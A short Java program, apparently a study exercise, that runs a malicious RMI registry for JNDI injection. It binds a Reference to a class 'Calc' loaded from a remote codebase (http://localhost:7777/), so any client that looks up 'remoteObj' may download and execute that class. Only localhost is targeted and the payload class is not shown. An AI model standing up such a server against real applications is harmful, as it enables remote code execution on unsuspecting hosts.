package com.wsh.JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext ctx = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
//        ctx.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
        Reference ref = new Reference("com.wsh.JNDI.Calc","com.wsh.JNDI.Calc","http://localhost:7777/");
//        ReferenceWrapper refWrapper = new ReferenceWrapper(ref);
        ctx.rebind("rmi://localhost:1099/remoteObj",ref);
    }
}
